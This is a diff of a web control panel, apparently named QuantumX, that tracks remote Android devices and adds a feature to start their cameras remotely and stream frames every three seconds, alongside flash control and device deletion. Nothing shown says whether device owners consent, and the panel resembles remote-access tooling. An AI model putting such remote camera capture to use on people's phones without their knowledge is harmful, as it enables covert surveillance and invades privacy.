@@ -523,32 +523,171 @@
             min-width: 100px;
         }
         
-        /* FLASH CONTROL SECTION */
-        .flash-control-section {
+        /* EXPANDABLE SECTION */
+        .expandable-section {
             background: var(--bg-tertiary);
             border: 1px solid var(--border-color);
             border-radius: 16px;
-            padding: 20px;
             margin-bottom: 20px;
+            overflow: hidden;
         }
         
-        .flash-title {
+        .section-header {
             display: flex;
             align-items: center;
-            gap: 10px;
-            margin-bottom: 15px;
-            color: var(--accent-primary);
+            justify-content: space-between;
+            padding: 16px 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .section-header:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+        
+        .section-header .title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
             font-weight: 600;
         }
         
-        .flash-title i {
+        .section-header .title i {
             font-size: 20px;
+        }
+        
+        .section-header .arrow {
+            transition: transform 0.3s;
+        }
+        
+        .section-header.expanded .arrow {
+            transform: rotate(180deg);
+        }
+        
+        .section-content {
+            max-height: 0;
+            padding: 0 20px;
+            transition: all 0.3s;
+            overflow: hidden;
+        }
+        
+        .section-content.expanded {
+            max-height: 500px;
+            padding: 0 20px 20px 20px;
+        }
+        
+        /* FLASH SECTION */
+        .flash-section .section-header .title i {
+            color: var(--accent-primary);
+        }
+        
+        /* CAMERA SECTION */
+        .camera-section .section-header .title i {
+            color: var(--info);
+        }
+        
+        .camera-preview {
+            background: #000;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            min-height: 200px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            border: 2px solid var(--border-color);
+            margin-bottom: 15px;
+        }
+        
+        .camera-preview.active {
+            border-color: var(--success);
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+        }
+        
+        .preview-placeholder {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+        
+        .preview-placeholder i {
+            font-size: 48px;
+            margin-bottom: 10px;
+            opacity: 0.5;
+        }
+        
+        .preview-image {
+            width: 100%;
+            max-height: 300px;
+            object-fit: contain;
+            border-radius: 8px;
+        }
+        
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid var(--border-color);
+            border-top-color: var(--accent-primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .camera-controls {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+        
+        .btn-camera {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.3s;
+            flex: 1;
+        }
+        
+        .btn-start {
+            background: linear-gradient(135deg, var(--success) 0%, #00cc6a 100%);
+            color: var(--bg-primary);
+        }
+        
+        .btn-start:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0, 255, 136, 0.2);
+        }
+        
+        .btn-stop {
+            background: linear-gradient(135deg, var(--danger) 0%, #cc0000 100%);
+            color: white;
+        }
+        
+        .btn-stop:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(255, 51, 102, 0.2);
+        }
+        
+        .btn-stop:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
         }
         
         .duration-input-group {
             display: flex;
             gap: 10px;
-            margin-bottom: 15px;
+            margin-top: 15px;
             flex-wrap: wrap;
         }
         
@@ -568,11 +707,6 @@
             outline: none;
             border-color: var(--accent-primary);
             box-shadow: 0 0 0 3px rgba(0, 255, 136, 0.1);
-        }
-        
-        .duration-input-group input::placeholder {
-            color: var(--text-secondary);
-            opacity: 0.5;
         }
         
         .btn-send {
@@ -754,11 +888,6 @@
             animation: spin 1s linear infinite;
         }
         
-        @keyframes spin {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-        
         /* Responsive */
         @media (max-width: 768px) {
             .menu-toggle {
@@ -795,6 +924,10 @@
                 flex-direction: column;
             }
             
+            .camera-controls {
+                flex-direction: column;
+            }
+            
             .notification {
                 left: 20px;
                 right: 20px;
@@ -815,7 +948,7 @@
             <div class="logo-small">
                 <span class="logo-quantum">Q</span><span class="logo-x">X</span>
             </div>
-            <div class="version">v1.0</div>
+            <div class="version">v2.0</div>
         </div>
         
         <div class="sidebar-menu">
@@ -950,27 +1083,65 @@
                     <p><strong>Status:</strong> <span id="info-status">-</span></p>
                 </div>
                 
-                <!-- FLASH CONTROL DENGAN COOLDOWN -->
-                <div class="flash-control-section">
-                    <div class="flash-title">
-                        <i class="fas fa-bolt"></i>
-                        <span>Flash Control</span>
+                <!-- FLASH CONTROL - EXPANDABLE -->
+                <div class="expandable-section flash-section">
+                    <div class="section-header" id="flash-header" onclick="toggleSection('flash')">
+                        <div class="title">
+                            <i class="fas fa-bolt"></i>
+                            <span>Flash Control</span>
+                        </div>
+                        <i class="fas fa-chevron-down arrow" id="flash-arrow"></i>
                     </div>
-                    
-                    <div class="duration-input-group">
-                        <input type="number" id="flash-duration" min="1" max="60" value="2" placeholder="Duration (seconds)">
-                        <div style="position: relative; flex: 1; min-width: 150px;">
-                            <button class="btn-send" id="send-flash-btn" onclick="sendFlashCommand()">
-                                <i class="fas fa-paper-plane"></i>
-                                <span id="btn-text">Send Flash</span>
-                                <span id="cooldown-timer" class="cooldown-text"></span>
-                                <div id="cooldown-progress" class="cooldown-progress"></div>
+                    <div class="section-content" id="flash-content">
+                        <div class="duration-input-group">
+                            <input type="number" id="flash-duration" min="1" max="60" value="2" placeholder="Duration (seconds)">
+                            <div style="position: relative; flex: 1; min-width: 150px;">
+                                <button class="btn-send" id="send-flash-btn" onclick="sendFlashCommand()">
+                                    <i class="fas fa-paper-plane"></i>
+                                    <span id="btn-text">Send Flash</span>
+                                    <span id="cooldown-timer" class="cooldown-text"></span>
+                                    <div id="cooldown-progress" class="cooldown-progress"></div>
+                                </button>
+                            </div>
+                        </div>
+                        <small style="color: var(--text-secondary); display: block; margin-top: 5px;">
+                            <i class="fas fa-info-circle"></i> Enter duration 1-60 seconds
+                        </small>
+                    </div>
+                </div>
+                
+                <!-- CAMERA PREVIEW - EXPANDABLE -->
+                <div class="expandable-section camera-section">
+                    <div class="section-header" id="camera-header" onclick="toggleSection('camera')">
+                        <div class="title">
+                            <i class="fas fa-camera"></i>
+                            <span>Camera Preview</span>
+                        </div>
+                        <i class="fas fa-chevron-down arrow" id="camera-arrow"></i>
+                    </div>
+                    <div class="section-content" id="camera-content">
+                        <div class="camera-preview" id="camera-preview">
+                            <div class="preview-placeholder" id="preview-placeholder">
+                                <i class="fas fa-camera"></i>
+                                <p>Camera preview will appear here</p>
+                            </div>
+                            <img class="preview-image" id="preview-image" style="display: none;">
+                            <div class="loading-spinner" id="camera-loading" style="display: none;"></div>
+                        </div>
+                        <div class="camera-controls">
+                            <button class="btn-camera btn-start" id="start-camera-btn" onclick="startCameraPreview()">
+                                <i class="fas fa-play"></i>
+                                <span>Start</span>
+                            </button>
+                            <button class="btn-camera btn-stop" id="stop-camera-btn" onclick="stopCameraPreview()" disabled>
+                                <i class="fas fa-stop"></i>
+                                <span>Stop</span>
                             </button>
                         </div>
+                        <small style="color: var(--text-secondary); display: block; margin-top: 5px; text-align: center;">
+                            <i class="fas fa-sync-alt"></i> Updates every 3 seconds
+                        </small>
                     </div>
-                    <small style="color: var(--text-secondary); display: block; margin-top: 5px;">
-                        <i class="fas fa-info-circle"></i> Enter duration 1-60 seconds
-                    </small>
                 </div>
                 
                 <!-- DELETE DEVICE BUTTON -->
@@ -1012,6 +1183,10 @@
         
         // Keep-alive interval
         let keepAliveInterval = null;
+        
+        // Camera preview variables
+        let isCameraActive = false;
+        let cameraInterval = null;
         
         // ========== INIT ==========
         (function() {
@@ -1091,6 +1266,16 @@
             document.getElementById('notification').classList.remove('show');
         }
         
+        // ========== EXPANDABLE SECTIONS ==========
+        function toggleSection(section) {
+            const header = document.getElementById(section + '-header');
+            const content = document.getElementById(section + '-content');
+            const arrow = document.getElementById(section + '-arrow');
+            
+            header.classList.toggle('expanded');
+            content.classList.toggle('expanded');
+        }
+        
         // ========== COOLDOWN FUNCTION ==========
         function startCooldown(duration) {
             if (isCooldown) return;
@@ -1104,19 +1289,16 @@
             const cooldownProgress = document.getElementById('cooldown-progress');
             const durationInput = document.getElementById('flash-duration');
             
-            // Disable button and input
             sendBtn.disabled = true;
             sendBtn.classList.add('cooldown');
             durationInput.disabled = true;
             
-            // Update cooldown setiap 100ms
             cooldownInterval = setInterval(() => {
                 const now = Date.now();
                 const remaining = Math.max(0, cooldownEndTime - now);
                 const remainingSeconds = Math.ceil(remaining / 1000);
                 
                 if (remaining <= 0) {
-                    // Cooldown selesai
                     clearInterval(cooldownInterval);
                     isCooldown = false;
                     sendBtn.disabled = false;
@@ -1126,13 +1308,106 @@
                     cooldownTimer.textContent = '';
                     cooldownProgress.style.width = '0%';
                 } else {
-                    // Update tampilan
                     const progress = ((duration * 1000) - remaining) / (duration * 1000) * 100;
                     cooldownProgress.style.width = progress + '%';
                     btnText.textContent = 'Waiting';
                     cooldownTimer.textContent = `(${remainingSeconds}s)`;
                 }
             }, 100);
+        }
+        
+        // ========== CAMERA PREVIEW FUNCTIONS ==========
+        function startCameraPreview() {
+            if (!currentDevice) {
+                showNotification('No device selected', 'error');
+                return;
+            }
+            
+            if (isCameraActive) return;
+            
+            isCameraActive = true;
+            document.getElementById('start-camera-btn').disabled = true;
+            document.getElementById('stop-camera-btn').disabled = false;
+            document.getElementById('camera-preview').classList.add('active');
+            
+            // Show loading
+            document.getElementById('preview-placeholder').style.display = 'none';
+            document.getElementById('preview-image').style.display = 'none';
+            document.getElementById('camera-loading').style.display = 'block';
+            
+            // Send start command to device
+            fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': 'Bearer ' + token
+                },
+                body: JSON.stringify({ 
+                    command: 'camera_start',
+                    params: { interval: 3000 } // 3 detik
+                })
+            }).catch(err => console.error('Start camera error:', err));
+            
+            // Start polling every 3 seconds
+            cameraInterval = setInterval(() => {
+                if (!isCameraActive || !currentDevice) {
+                    stopCameraPreview();
+                    return;
+                }
+                
+                // Request new frame
+                fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': 'Bearer ' + token
+                    },
+                    body: JSON.stringify({ 
+                        command: 'camera_frame',
+                        params: {}
+                    })
+                }).catch(err => console.error('Frame request error:', err));
+                
+            }, 3000);
+            
+            showNotification('Camera preview started', 'success');
+        }
+        
+        function stopCameraPreview() {
+            if (!isCameraActive) return;
+            
+            isCameraActive = false;
+            document.getElementById('start-camera-btn').disabled = false;
+            document.getElementById('stop-camera-btn').disabled = true;
+            document.getElementById('camera-preview').classList.remove('active');
+            
+            // Hide image and show placeholder
+            document.getElementById('preview-placeholder').style.display = 'block';
+            document.getElementById('preview-image').style.display = 'none';
+            document.getElementById('camera-loading').style.display = 'none';
+            
+            // Clear interval
+            if (cameraInterval) {
+                clearInterval(cameraInterval);
+                cameraInterval = null;
+            }
+            
+            // Send stop command to device
+            if (currentDevice) {
+                fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': 'Bearer ' + token
+                    },
+                    body: JSON.stringify({ 
+                        command: 'camera_stop',
+                        params: {}
+                    })
+                }).catch(err => console.error('Stop camera error:', err));
+            }
+            
+            showNotification('Camera preview stopped', 'info');
         }
         
         // ========== WEBSOCKET ==========
@@ -1150,12 +1425,10 @@
                 });
                 
                 socket.on('connect', () => {
-                    console.log('✅ WebSocket connected via:', socket.io.engine.transport.name);
+                    console.log('✅ WebSocket connected');
                     updateConnectionStatus(true);
                     socket.emit('panel-connect', {});
                     showNotification('Connected to server', 'success');
-                    
-                    // Start keep-alive
                     startKeepAlive();
                 });
                 
@@ -1169,84 +1442,90 @@
                     updateConnectionStatus(false);
                     stopKeepAlive();
                     
-                    // Auto reconnect
                     if (reason === 'io server disconnect' || reason === 'transport close' || reason === 'ping timeout') {
-                        setTimeout(() => {
-                            socket.connect();
-                        }, 3000);
+                        setTimeout(() => socket.connect(), 3000);
                     }
                 });
                 
-             socket.on('device-status', (data) => {
-    console.log('📱 Device status:', data);
-    
-    const deviceId = data.deviceId;
-    const isOnline = data.status === 'online';
-    
-    // JIKA DEVICE ONLINE, HAPUS DARI DELETED DEVICES!
-    if (isOnline && deletedDevices.has(deviceId)) {
-        console.log('🔄 Device online, removing from deleted list:', deviceId);
-        deletedDevices.delete(deviceId);
-        localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
-    }
-    
-    if (deletedDevices.has(deviceId)) {
-        console.log('🚫 Device ignored (deleted):', deviceId);
-        return;
-    }
-    
-    // AMBIL DATA LAMA KALO ADA
-    const existingDevice = wsDevices.get(deviceId);
-    
-    wsDevices.set(deviceId, {
-        deviceId: deviceId,
-        deviceName: existingDevice?.deviceName || data.deviceName || 'Unknown',
-        model: existingDevice?.model || data.model || 'Unknown',
-        androidVersion: existingDevice?.androidVersion || data.androidVersion || 'Unknown',
-        batteryLevel: existingDevice?.batteryLevel || data.batteryLevel || 0,
-        lastSeen: new Date().toISOString(),
-        online: isOnline,
-        fromWS: true
-    });
-    
-    mergeAndRenderDevices();
-    updateStats();
-});
-              socket.on('heartbeat', (data) => {
-    console.log('💓 Heartbeat:', data);
-    
-    const deviceId = data.deviceId;
-    
-    // JIKA ADA HEARTBEAT, HAPUS DARI DELETED DEVICES!
-    if (deletedDevices.has(deviceId)) {
-        console.log('🔄 Heartbeat received, removing from deleted list:', deviceId);
-        deletedDevices.delete(deviceId);
-        localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
-    }
-    
-    const existingDevice = wsDevices.get(deviceId);
-    
-    wsDevices.set(deviceId, {
-        deviceId: deviceId,
-        deviceName: data.deviceName || existingDevice?.deviceName || 'Unknown',
-        model: data.model || existingDevice?.model || 'Unknown',
-        androidVersion: data.androidVersion || existingDevice?.androidVersion || 'Unknown',
-        batteryLevel: data.batteryLevel || existingDevice?.batteryLevel || 0,
-        lastSeen: new Date().toISOString(),
-        online: true,
-        fromWS: true
-    });
-    
-    mergeAndRenderDevices();
-    updateStats();
-});
-                
-                // Handle pong
-                socket.on('pong', () => {
-                    console.log('🏓 Pong received');
+                socket.on('device-status', (data) => {
+                    console.log('📱 Device status:', data);
+                    
+                    const deviceId = data.deviceId;
+                    const isOnline = data.status === 'online';
+                    
+                    if (isOnline && deletedDevices.has(deviceId)) {
+                        console.log('🔄 Device online, removing from deleted list:', deviceId);
+                        deletedDevices.delete(deviceId);
+                        localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
+                    }
+                    
+                    if (deletedDevices.has(deviceId)) return;
+                    
+                    const existingDevice = wsDevices.get(deviceId);
+                    
+                    wsDevices.set(deviceId, {
+                        deviceId: deviceId,
+                        deviceName: existingDevice?.deviceName || data.deviceName || 'Unknown',
+                        model: existingDevice?.model || data.model || 'Unknown',
+                        androidVersion: existingDevice?.androidVersion || data.androidVersion || 'Unknown',
+                        batteryLevel: existingDevice?.batteryLevel || data.batteryLevel || 0,
+                        lastSeen: new Date().toISOString(),
+                        online: isOnline,
+                        fromWS: true
+                    });
+                    
+                    mergeAndRenderDevices();
+                    updateStats();
                 });
                 
-                // Handle command results
+                socket.on('heartbeat', (data) => {
+                    console.log('💓 Heartbeat:', data);
+                    
+                    const deviceId = data.deviceId;
+                    
+                    if (deletedDevices.has(deviceId)) {
+                        console.log('🔄 Heartbeat received, removing from deleted list:', deviceId);
+                        deletedDevices.delete(deviceId);
+                        localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
+                    }
+                    
+                    const existingDevice = wsDevices.get(deviceId);
+                    
+                    wsDevices.set(deviceId, {
+                        deviceId: deviceId,
+                        deviceName: data.deviceName || existingDevice?.deviceName || 'Unknown',
+                        model: data.model || existingDevice?.model || 'Unknown',
+                        androidVersion: data.androidVersion || existingDevice?.androidVersion || 'Unknown',
+                        batteryLevel: data.batteryLevel || existingDevice?.batteryLevel || 0,
+                        lastSeen: new Date().toISOString(),
+                        online: true,
+                        fromWS: true
+                    });
+                    
+                    mergeAndRenderDevices();
+                    updateStats();
+                });
+                
+                // Handle camera frame
+                socket.on('camera-frame', (data) => {
+                    console.log('📸 Camera frame received');
+                    
+                    if (data.deviceId === currentDevice?.deviceId && isCameraActive) {
+                        const previewImg = document.getElementById('preview-image');
+                        const placeholder = document.getElementById('preview-placeholder');
+                        const loading = document.getElementById('camera-loading');
+                        
+                        if (data.imageData) {
+                            previewImg.src = 'data:image/jpeg;base64,' + data.imageData;
+                            previewImg.style.display = 'block';
+                            placeholder.style.display = 'none';
+                            loading.style.display = 'none';
+                        }
+                    }
+                });
+                
+                socket.on('pong', () => console.log('🏓 Pong received'));
+                
                 socket.on('command-result', (data) => {
                     console.log('Command result:', data);
                     
@@ -1307,16 +1586,11 @@
         async function loadDevices() {
             try {
                 const response = await fetch(backendUrl + '/api/devices', {
-                    headers: {
-                        'Authorization': 'Bearer ' + token
-                    }
+                    headers: { 'Authorization': 'Bearer ' + token }
                 });
                 
                 if (!response.ok) {
-                    if (response.status === 401) {
-                        logout();
-                        return;
-                    }
+                    if (response.status === 401) logout();
                     throw new Error('Failed to load devices');
                 }
                 
@@ -1334,14 +1608,10 @@
         function mergeAndRenderDevices() {
             let allDevices = [];
             
-            // Prioritas: data dari WebSocket (lebih realtime)
             wsDevices.forEach((wsDevice, id) => {
-                if (!deletedDevices.has(id)) {
-                    allDevices.push(wsDevice);
-                }
+                if (!deletedDevices.has(id)) allDevices.push(wsDevice);
             });
             
-            // Tambah dari API yang belum ada di WebSocket
             devices.forEach(d => {
                 if (!deletedDevices.has(d.deviceId) && !allDevices.find(dev => dev.deviceId === d.deviceId)) {
                     allDevices.push(d);
@@ -1464,6 +1734,11 @@
         
         // ========== MODAL ==========
         function openDeviceModal(device) {
+            // Stop camera if active
+            if (isCameraActive) {
+                stopCameraPreview();
+            }
+            
             currentDevice = device;
             
             document.getElementById('modal-device-name').textContent = device.deviceName || device.deviceId;
@@ -1479,12 +1754,33 @@
             const isOnline = device.online && diffMinutes < 5;
             document.getElementById('info-status').textContent = isOnline ? 'Online' : 'Offline';
             
+            // Reset flash
             document.getElementById('flash-duration').value = 2;
             document.getElementById('flash-duration').disabled = false;
+            
+            // Reset camera
+            document.getElementById('start-camera-btn').disabled = false;
+            document.getElementById('stop-camera-btn').disabled = true;
+            document.getElementById('preview-placeholder').style.display = 'block';
+            document.getElementById('preview-image').style.display = 'none';
+            document.getElementById('camera-loading').style.display = 'none';
+            document.getElementById('camera-preview').classList.remove('active');
+            
+            // Reset sections (collapsed)
+            document.getElementById('flash-content').classList.remove('expanded');
+            document.getElementById('flash-arrow').style.transform = 'rotate(0deg)';
+            document.getElementById('camera-content').classList.remove('expanded');
+            document.getElementById('camera-arrow').style.transform = 'rotate(0deg)';
+            
             document.getElementById('device-modal').classList.add('active');
         }
         
         function closeModal() {
+            // Stop camera if active
+            if (isCameraActive) {
+                stopCameraPreview();
+            }
+            
             document.getElementById('device-modal').classList.remove('active');
             currentDevice = null;
         }
@@ -1560,7 +1856,6 @@
                 deletedDevices.add(currentDevice.deviceId);
                 localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
                 
-                // Hapus dari semua storage
                 const index = devices.findIndex(d => d.deviceId === currentDevice.deviceId);
                 if (index !== -1) devices.splice(index, 1);
                 
@@ -1586,20 +1881,13 @@
         }
         
         function switchTab(tabName, element) {
-            document.querySelectorAll('.menu-item').forEach(item => {
-                item.classList.remove('active');
-            });
+            document.querySelectorAll('.menu-item').forEach(item => item.classList.remove('active'));
             element.classList.add('active');
             
-            document.querySelectorAll('.tab-content').forEach(tab => {
-                tab.style.display = 'none';
-            });
+            document.querySelectorAll('.tab-content').forEach(tab => tab.style.display = 'none');
             document.getElementById(tabName + '-tab').style.display = 'block';
             
-            const titles = {
-                devices: 'Devices',
-                settings: 'Settings'
-            };
+            const titles = { devices: 'Devices', settings: 'Settings' };
             document.getElementById('page-title').textContent = titles[tabName];
             
             if (window.innerWidth <= 768) {
@@ -1615,6 +1903,7 @@
         
         function logout() {
             stopKeepAlive();
+            if (isCameraActive) stopCameraPreview();
             if (socket) socket.disconnect();
             localStorage.removeItem('quantumx_token');
             localStorage.removeItem('quantumx_user');
@@ -1623,15 +1912,11 @@
         
         document.addEventListener('click', function(e) {
             const modal = document.getElementById('device-modal');
-            if (e.target === modal) {
-                closeModal();
-            }
+            if (e.target === modal) closeModal();
         });
         
         document.getElementById('flash-duration')?.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter' && !isCooldown) {
-                sendFlashCommand();
-            }
+            if (e.key === 'Enter' && !isCooldown) sendFlashCommand();
         });
     </script>
 </body>
